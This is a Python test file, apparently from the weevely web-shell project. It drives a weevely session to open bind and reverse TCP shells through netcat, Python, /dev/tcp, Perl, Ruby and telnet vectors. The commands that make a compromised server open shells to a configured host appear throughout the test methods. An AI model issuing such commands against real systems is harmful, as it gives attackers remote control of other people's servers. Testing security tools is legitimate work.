#from baseclasses import ExecTestCase
import pexpect
from random import randint
from unittest import TestCase, skipIf
from test import conf
import sys, os
sys.path.append(os.path.abspath('..'))
from modules.backdoor.reversetcp import WARN_BINDING_SOCKET

@skipIf(not conf['shell_sh'], "Skipping shell.sh dependent tests")
class Backdoors(TestCase):
    def setUp(self):
        
        self.ports = range(int(conf['backdoor_tcp_startport']), int(conf['backdoor_tcp_endport']))
                      
        call = ''
        command = '%s %s %s %s' % (conf['cmd'], conf['url'], conf['pwd'], call)
        self.process = pexpect.spawn(command, timeout=5)
        
        idx = self.process.expect(['.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error spawning weevely: %s%s' % (self.process.before, self.process.after))
        
    def tearDown(self):
        self.process.close()
        
    def _check_oob_shell(self, cmd, testcmd, testresult):
        
        self.process.send(cmd)

        idx = self.process.expect(['\n','\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertNotEqual(idx, 2, 'Error connecting to port: %s%s' % (self.process.before, self.process.after))
        self.process.send(testcmd)
        
        idx = self.process.expect([str(testresult), pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error executing commands: %s%s' % (self.process.before, self.process.after))
        self.process.send('exit;\r\n')    
        
        idx = self.process.expect(['.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error returning to Weevely shell: %s%s' % (self.process.before, self.process.after))
        
    def _check_oob_shell_errors(self, cmd, expectedmsg):
        
        self.process.send(cmd)
        
        idx = self.process.expect([expectedmsg, '\$', '.+@.+:.+ (?:(PHP) >)|(?: \$) ', pexpect.TIMEOUT, pexpect.EOF])
        self.assertEqual(idx, 0, 'Error expecting error message: %s%s' % (self.process.before, self.process.after))
        
    @skipIf(not conf['backdoor_tcp_startport'] or not conf['backdoor_tcp_endport'], "Skipping backdoor direct connect")
    def test_tcp(self):
        testvalue = randint(1,100)*2
        self._check_oob_shell(':backdoor.tcp %i\r\n' % self.ports.pop(0), 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )

    @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
    def test_reverse_tcp(self):
        testvalue = randint(1,100)*2
        self._check_oob_shell(':backdoor.reversetcp %s\r\n' % conf['backdoor_reverse_tcp_host'], 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
        
        testvectors = [ [v,  randint(20000,25000)] for v in ('netcat-traditional', 'netcat-bsd', 'python', 'devtcp', 'perl', 'ruby', 'telnet') ]
        for vector in testvectors:
            self._check_oob_shell(':backdoor.reversetcp %s -vector %s -port %i\r\n' % (conf['backdoor_reverse_tcp_host'], vector[0], vector[1]), 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
        
        
    @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
    def test_reverse_tcp_error(self):
        self._check_oob_shell_errors(':backdoor.reversetcp %s -port 80\r\n' % conf['backdoor_reverse_tcp_host'],   WARN_BINDING_SOCKET)
        